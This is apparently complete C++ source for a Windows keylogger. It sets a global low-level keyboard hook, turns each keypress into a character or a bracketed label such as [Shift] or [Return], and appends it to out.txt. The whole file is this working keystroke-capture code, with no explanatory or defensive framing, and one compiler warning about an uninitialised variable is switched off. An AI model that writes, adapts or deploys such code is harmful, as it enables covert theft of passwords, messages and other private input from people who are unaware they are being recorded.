#include <Windows.h>
#include <time.h>
#include <iostream>
#include <fstream>

#pragma warning(disable: 4703)

using namespace std;

int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

ofstream file;

int Save(int key)
{
	if (key == 1 || key == 2)
	{
		return 0;
	}

	HWND foregroundWindow = GetForegroundWindow();
	DWORD threadId;
	HKL keyboardLayout;
	if (foregroundWindow)
	{
		threadId = GetWindowThreadProcessId(foregroundWindow, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);
	}
	cout << key << endl;
	if (key == VK_BACK)
	{
		file << "[Backspace]";
	}
	else if (key == VK_DELETE)
	{
		file << "[Delete]";
	}
	/*else if (key == )
	{
		file << "[]";
	}*/
	else if (key == VK_SPACE)
	{
		file << " ";
	}
	else if (key == VK_RETURN)
	{
		file << "[Return]\n";
	}
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
	{
		file << "[Ctrl]";
	}
	else if (key == VK_ESCAPE)
	{
		file << "[Esc]";
	}
	else if (key == VK_TAB)
	{
		file << "[Tab]";
	}
	else if (key == VK_LEFT)
	{
		file << "[Left]";
	}
	else if (key == VK_RIGHT)
	{
		file << "[Right]";
	}
	else if (key == VK_UP)
	{
		file << "[Up]";
	}
	else if (key == VK_DOWN)
	{
		file << "[Down]";
	}
	else if (key == VK_CAPITAL)
	{
		file << "[CapsLock]";
	}
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
	{
		file << "[Shift]";
	}
	else
	{
		char currentKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lower = !lower;
		}
		currentKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);
		if (!lower)
		{
			currentKey = tolower(currentKey);
		}
		file << char(currentKey);
	}
	file.flush();
	return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	file.open("out.txt");
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, L"Error", L"Error", MB_ICONERROR);
	}
	MSG message;
	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}